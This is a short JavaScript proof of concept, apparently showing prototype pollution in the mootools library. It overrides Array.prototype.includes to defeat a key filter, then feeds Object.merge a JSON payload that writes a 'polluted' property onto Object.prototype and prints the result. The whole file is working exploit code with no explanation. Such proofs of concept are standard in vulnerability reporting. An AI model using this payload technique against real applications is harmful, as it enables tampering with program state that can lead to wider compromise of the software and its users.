Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
require('mootools');
console.log({}.polluted);
Object.merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);